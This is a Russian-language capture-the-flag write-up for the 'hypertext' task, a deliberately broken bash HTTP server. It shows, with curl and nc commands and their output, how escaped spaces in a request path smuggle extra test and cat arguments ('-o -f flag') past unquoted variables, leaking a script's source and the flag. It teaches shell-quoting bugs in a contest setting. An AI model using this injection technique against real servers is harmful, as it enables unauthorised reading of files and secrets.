# hypertext: Write-up

Нас встречает ссылка на `http` с явно указанным портом. Открываем, и, по крайней мере в Firefox вместо текста страницы видно кракозябры.

![](./writeup/index-mojibake.png)

Исправляем кодировку и видим это:

![](./writeup/index.png)

Ага, самописная поделка. Может она скажет о себе в заголовках? Открываем инспектор и смотрим:

![](./writeup/headers.png)

Powered by... bash?? Очень странно, кому в голову пришло делать *такое*?

Откатываемся на полшага назад и смотрим, что вообще отдаёт сервер.

```shell
$ curl -i http://hypertext.q.2025.ugractf.ru:3253/aa33j9cjswotquex
HTTP/1.1 307 temporary-redirect
X-Powered-By: bash/5.2.37
Connection: close
Location: /aa33j9cjswotquex/index.html

total 20
drwxr-xr-x 2 nobody nobody 4096 Mar  8 02:40 .
drwxr-xr-x 3 nobody nobody 4096 Mar  8 02:40 ..
-rwxr-xr-x 1 nobody nobody  368 Mar  8 02:40 flag
-rw-r--r-- 1 nobody nobody 1826 Mar  8 02:40 index.html
-rwxr-xr-x 1 nobody nobody 2866 Mar  8 02:40 server
```

Сервер отдаёт листинг директории даже если есть `index.html`. Неожиданная фича.

Протыкаем каждый файлик:
- `index.html`: Заглавная страница, на которой нет ничего интересного
- `server`: [исходные коды сервера](./app/source/server)
- `flag`: странная сущность:

```shell
$ curl -i http://hypertext.q.2025.ugractf.ru:3253/aa33j9cjswotquex/flag
HTTP/1.1 410 gone
X-Powered-By: bash/5.2.37
Connection: close
$ curl -i -I http://hypertext.q.2025.ugractf.ru:3253/aa33j9cjswotquex/flag
HTTP/1.1 410 gone
X-Powered-By: bash/5.2.37
Connection: close
$ curl -i -X POST http://hypertext.q.2025.ugractf.ru:3253/aa33j9cjswotquex/flag
HTTP/1.1 405 method-not-allowed
X-Powered-By: bash/5.2.37
Connection: close
$ curl -i -X PUT http://hypertext.q.2025.ugractf.ru:3253/aa33j9cjswotquex/flag
HTTP/1.1 501 unimplemented
X-Powered-By: bash/5.2.37
Connection: close
Content-Type: text/html

<head><title>501 unimplemented</title></head><body><h1>501 unimplemented</h1><img src=https://http.cat/501><hr>bash/5.2.37</body>
```

Видно, что `flag` — исполняемый, и волен делать что хочет на запросы к нему. Можно попробовать вытащить его исходный код, если в сервере есть уязвимость.

Исходный код сервер отдаёт, если выполняются эти условия:

```bash
if [ -f $Path ]; then
    if [ ! -x $Path ]; then
        if [ -r $Path ]; then
            case $RequestType in
                GET) cat -- $Path | reply 200 ;;
```

Откуда получается `$Path`?

```bash
read RequestType RequestPath RequestProto

...

: ${Home=.}
# All incoming paths are absolute
RequestPath=$(realpath -sm "$RequestPath")
Path=$Home/$RequestPath

...
```

Можно запустить `shellcheck` на этом файле и понять, что сервер писался, явно игнорируя все правила техники безопасности. Можно ещё заметить, что `read` используется без флага `-r`, что совсем не безопасно:

```shell
$ help read | grep -- -r
      -r    do not allow backslashes to escape any characters
```

То есть `read` без `-r` умеет раскрывать `\`-последовательности, например:

```shell
$ cat test
GET /some/cursed/path\ with\ escapes HTTP/1.1
$ read one two three <test
$ declare -p one two three
declare -- one="GET"
declare -- two="/some/cursed/path with escapes"
declare -- three="HTTP/1.1"
```

Безопасное поведение (с флагом `-r`), которое соответствует разделам 3.2.1 и 5.1 [RFC 1945: Hypertext Transfer Protocol -- HTTP/1.0](https://www.rfc-editor.org/rfc/rfc1945.html) выглядит так:

```shell
$ read -r one two three <test
$ declare -p one two three
declare -- one="GET"
declare -- two="/some/cursed/path\\"
declare -- three="with\\ escapes HTTP/1.1"
```

Приехали.

> Примечание. Сервер "откусывает" от пути только `/<token>` и кладёт в заголовок `X-Token`. Больше никаких манипуляций не проводится

Посмотрим, что будет, если подсунуть путь с пробелами. Поставим перед `if`-ами `declare -p Path; exit 1` и запустим локально:

```shell
$ ./server < <(printf 'GET /one\ two\ three HTTP/1.1\n\n')
declare -- Path=".//one two three"
```

> Подсказка: `[`

В bash для условий советуют использовать `[[` (compound command), а не `test` / `[` (builtin). Посмотреть, чем `[[` так хорош, можно в `man bash`:

```
[[ expression ]]
          Return  a  status  of  0 or 1 depending on the evaluation of the
          conditional expression expression.  Expressions are composed  of
          the  primaries  described  below  under CONDITIONAL EXPRESSIONS.
          Word splitting and pathname expansion are not performed  on  the
          words  between  the  [[  and  ]]; tilde expansion, parameter and
          variable expansion, arithmetic expansion, command  substitution,
          process  substitution,  and quote removal are performed.  Condi-
          tional operators such as -f must be unquoted to be recognized as
          primaries.
```

Важный кусок здесь — *word splitting and pathname expansion are not performed on the words between `[[` and `]]`*. Так как `[` и `test` это просто builtin-ы, к ним это не применяется, и `[ -f $Path ]`, если `declare -- Path="some cursed path"`, будет раскрываться в `[ -f some cursed path ]`, а `[[ -f $Path ]]` — в `[[ -f "some cursed path" ]]`.

Можно скрафтить такой путь, чтобы условия выполнились, и мы получим исходный код скрипта.

Посмотрим на то, как текст вообще отдаётся сервером. `cat -- $Path | reply 200` — странная конструкция, особенно учитывая то, что в сорцах в `reply` тело ответа подают через редиректы. Если `declare -- Path="some cursed path"`, то `cat -- $Path` раскроется в `cat -- some cursed path`, а не в `cat -- "some cursed path"`, причём каждое из слов `some`, `cursed` и `path` будет проинтерпретировано `cat`-ом как имя файла, а не аргумент. Это позволяет спокойно использовать "слова", начинающиеся с `-` в Path — `cat` на них ругнётся, но продолжит исполнять, как ни в чём не бывало:

```shell
$ cat -- /etc/hostname --some -q -f --flags /etc/hostname
reimu
cat: --some: No such file or directory
cat: -q: No such file or directory
cat: -f: No such file or directory
cat: --flags: No such file or directory
reimu
$ echo $?
1
```

То есть `cat` сначала выведет всё, а потом уже ругнётся — поэтому `trap ... ERR` в коде не помешает получить содержимое файла `/flag`.

Попытаемся скрафтить такой `Path`, чтобы условия выполнились, и чтобы он содержал в себе `flag` как отдельное слово, чтобы `cat` вывел его содержимое.

У `[` есть интересная фича — логические условия.

```shell
$ help test
...
    Other operators:
    
      -o OPTION      True if the shell option OPTION is enabled.
      -v VAR         True if the shell variable VAR is set.
      -R VAR         True if the shell variable VAR is set and is a name
                     reference.
      ! EXPR         True if expr is false.
      EXPR1 -a EXPR2 True if both expr1 AND expr2 are true.
      EXPR1 -o EXPR2 True if either expr1 OR expr2 is true.
```

Одно из них звучит очень интригующе — `EXPR1 -o EXPR2`: логическое ИЛИ. Если сделать `declare -- Path="хороший-файл -o EXPR2`, где `хороший-файл` — файл, для которого мы можем получить исходный код, и `EXPR2` — какое-то валидное логическое выражение, которое содержит в себе слово `flag`, то сервер должен ответить склеенными `хороший-файл` и `flag`.

Пробуем локально.

```shell
$ echo 'File number one' > one
$ echo 'File number two' > two
$ chmod +x two
$ ./server < <(printf 'GET /one\ -o\ -f\ two HTTP/1.1\n\n') 2>/dev/null
HTTP/1.1 200 ok
X-Powered-By: bash/5.2.37
Connection: close

File number one
File number two
HTTP/1.1 500 internal-server-error
X-Powered-By: bash/5.2.37
Connection: close
Content-Type: text/html

<head><title>500 internal-server-error</title></head><body><h1>500 internal-server-error</h1><img src=https://http.cat/500><hr>bash/5.2.37</body>
```

Работает. Применяем payload на сервере, зная, что `one` — `index.html`, а `two` — `flag`:

```shell
$ nc -v hypertext.q.2025.ugractf.ru 3253 < <(printf 'GET /aa33j9cjswotquex/index.html\ -o\ -f\ flag HTTP/1.1\n\n')
Connection to hypertext.q.2025.ugractf.ru (135.181.93.68) 3253 port [tcp/pda-data] succeeded!
HTTP/1.1 200 ok
X-Powered-By: bash/5.2.37
Connection: close

<HTML>
<HEAD>
<TITLE>ВЭБ 0.7</TITLE>
</HEAD>
<BODY BGCOLOR=909090>
...
</BODY>
</HTML>
#!/usr/bin/env bash
case $RequestType in
    HEAD|GET)
        reply 410 </dev/null
        ;;
    POST)
        [[ "${RequestHeaders[User-Agent]}" != "Cat/1.1 Meow/2.10 Kernel/7.0" ]] && reply 405 </dev/null
        [[ "${RequestHeaders[X-Meow]}" != "mrrrp" ]] && reply 405 </dev/null
        reply 200 <<<"$KYZYLBORDA_SECRET_flag"
        ;;
    *) yeet 501 ;;
esac
HTTP/1.1 500 internal-server-error
X-Powered-By: bash/5.2.37
Connection: close
Content-Type: text/html

<head><title>500 internal-server-error</title></head><body><h1>500 internal-server-error</h1><img src=https://http.cat/500><hr>bash/5.2.37</body>
```

Ура, мы вытащили сорцы [`./flag`](./app/source/flag), и теперь мы понимаем, почему он так странно отвечал на запросы (410, 405 и 501). Крафтим нужные заголовки и пробуем получить флаг снова:

```shell
$ nc -v hypertext.q.2025.ugractf.ru 3253 < <(printf 'POST /aa33j9cjswotquex/flag\nUser-Agent: Cat/1.1 Meow/2.10 Kernel/7.0\nX-Meow: mrrrp\n\n')
Connection to hypertext.q.2025.ugractf.ru (135.181.93.68) 3253 port [tcp/pda-data] succeeded!
HTTP/1.1 200 ok
X-Powered-By: bash/5.2.37
Connection: close

ugra_inetd_and_bash_are_so_powerful_sh0odru7591l
```

Забираем флаг.

Флаг: **ugra_inetd_and_bash_are_so_powerful_sh0odru7591l**

## Интересные факты

Можно было бы написать HTTP-сервер на GNU Awk, но такое [уже делали](https://github.com/kevin-albert/awkserver) под непонятной лицензией, пришлось бы больше страдать, и не понятно куда вставить баг.

Этот сервер умеет общаться по [HTTP/0.9](https://www.w3.org/Protocols/HTTP/AsImplemented.html).

Этот сервер настолько сломанный, что перекладывать флаг из URL в хедеры оказалось [непросто](./controller/server.py).

[inetd](https://man.freebsd.org/cgi/man.cgi?query=inetd) — старый способ создавать сервисы Интернета — пишешь программу, которая общается с stdin/stdout, правишь одну строчку в конфиге, и получаешь возможность общаться с программой по TCP, UDP и/или Unix domain socket. Ещё можно было бы использовать более специализированный `tcpsvd`. В данной таске вместо этих инструментов использовался `socat`.

## Постмортем

Таск назвали гробом.

Получение исходных кодов сервера оказалось далеко не самой тривиальной затеей.

Найти баг в сотне строк кода на Bash почему-то очень сложно, хотя код простой.
